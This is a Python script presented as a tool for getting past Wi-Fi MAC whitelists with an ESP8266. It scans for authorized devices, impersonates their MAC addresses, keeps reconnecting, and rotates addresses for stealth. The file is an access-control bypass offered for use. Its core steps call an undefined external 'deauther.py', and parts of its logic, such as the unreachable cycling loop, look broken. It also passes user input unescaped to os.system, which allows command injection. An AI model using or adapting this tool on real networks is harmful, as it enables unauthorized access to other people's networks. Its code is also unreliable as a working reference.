import argparse
import os
import time
import random

# -------------------------------------------
# ESP8266 - Whitelist Bypass & MAC Spoofing Tool
# -------------------------------------------
# Features:
# - Bypasses MAC filtering and whitelist security
# - Spoofs MAC addresses from legitimate connected devices
# - Automates scanning for authorized devices
# - Supports randomized MAC address selection for stealth
# - Enables persistent reconnection to maintain access
# - Dynamic MAC cycling to rotate spoofed addresses periodically
# - Automated whitelisted network detection for seamless access
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Scan for authorized devices on the network:
#    python esp8266_whitelist_bypass.py --scan
# 2. Spoof a MAC address from the scan results:
#    python esp8266_whitelist_bypass.py --spoof "XX:XX:XX:XX:XX:XX"
# 3. Automatically select and spoof a random valid MAC:
#    python esp8266_whitelist_bypass.py --auto
# 4. Enable persistent connection mode:
#    python esp8266_whitelist_bypass.py --auto --persist
# 5. Enable dynamic MAC cycling (rotate MAC every X seconds):
#    python esp8266_whitelist_bypass.py --auto --cycle 30
# 6. Automate whitelisted network detection:
#    python esp8266_whitelist_bypass.py --detect
# -------------------------------------------

def scan_network():
    """Scans for authorized devices on the network."""
    print("[+] Scanning for whitelisted MAC addresses...")
    os.system("python deauther.py scan-mac > mac_scan_results.txt")
    print("[✔] Scan completed. Results saved to mac_scan_results.txt")

def spoof_mac(target_mac, persist=False, cycle_interval=0):
    """Spoofs a target MAC address."""
    print(f"[+] Spoofing MAC address: {target_mac}")
    command = f"python deauther.py spoof-mac --mac '{target_mac}'"
    os.system(command)
    if persist:
        print("[+] Enabling persistent mode...")
        while True:
            time.sleep(5)
            os.system(command)
    if cycle_interval:
        print(f"[+] Rotating MAC address every {cycle_interval} seconds...")
        while True:
            time.sleep(cycle_interval)
            new_mac = random_mac()
            print(f"[+] Spoofing new MAC: {new_mac}")
            os.system(f"python deauther.py spoof-mac --mac '{new_mac}'")

def auto_spoof(persist=False, cycle_interval=0):
    """Automatically selects a valid MAC address to spoof."""
    print("[+] Selecting a random whitelisted MAC address...")
    try:
        with open("mac_scan_results.txt", "r") as f:
            macs = [line.strip() for line in f.readlines()]
        if macs:
            selected_mac = random.choice(macs)
            print(f"[✔] Spoofing MAC: {selected_mac}")
            spoof_mac(selected_mac, persist, cycle_interval)
        else:
            print("[!] No valid MAC addresses found.")
    except FileNotFoundError:
        print("[!] No scan results available. Run --scan first.")

def detect_whitelisted_networks():
    """Detects networks that use MAC filtering for access control."""
    print("[+] Scanning for whitelisted networks...")
    os.system("python deauther.py detect-whitelist > whitelist_results.txt")
    print("[✔] Whitelist scan completed. Results saved to whitelist_results.txt")

def random_mac():
    """Generates a random MAC address."""
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Whitelist Bypass & MAC Spoofing Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for authorized MAC addresses on the network")
    parser.add_argument("--spoof", type=str, help="Spoof a specific MAC address")
    parser.add_argument("--auto", action='store_true', help="Automatically select and spoof a valid MAC")
    parser.add_argument("--persist", action='store_true', help="Enable persistent connection mode")
    parser.add_argument("--cycle", type=int, help="Enable dynamic MAC cycling (rotate MAC every X seconds)")
    parser.add_argument("--detect", action='store_true', help="Automate whitelisted network detection")
    args = parser.parse_args()

    if args.scan:
        scan_network()
    elif args.spoof:
        spoof_mac(args.spoof, args.persist, args.cycle if args.cycle else 0)
    elif args.auto:
        auto_spoof(args.persist, args.cycle if args.cycle else 0)
    elif args.detect:
        detect_whitelisted_networks()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
